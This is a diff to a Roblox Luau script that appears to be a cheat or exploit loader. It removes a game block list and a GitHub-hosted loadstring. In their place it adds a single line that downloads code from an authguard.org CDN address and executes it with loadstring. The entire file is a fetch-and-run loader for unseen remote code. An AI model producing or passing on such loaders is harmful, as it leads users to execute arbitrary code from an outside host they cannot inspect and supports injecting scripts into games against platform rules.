@@ -1,11 +1,1 @@
-local blockedGames = {127742093697776, 126884695634066, 109983668079237}
-local currentPlaceId = game.PlaceId
-
-for _, blockedId in ipairs(blockedGames) do
-    if currentPlaceId == blockedId then
-        game:GetService("Players").LocalPlayer:Kick("Enough with those addicted games.")
-        return
-    end
-end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/usernamed19dj/Script/refs/heads/main/luau.txt"))()
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c532410ae3d848098ba11d5ec85cb009"))()
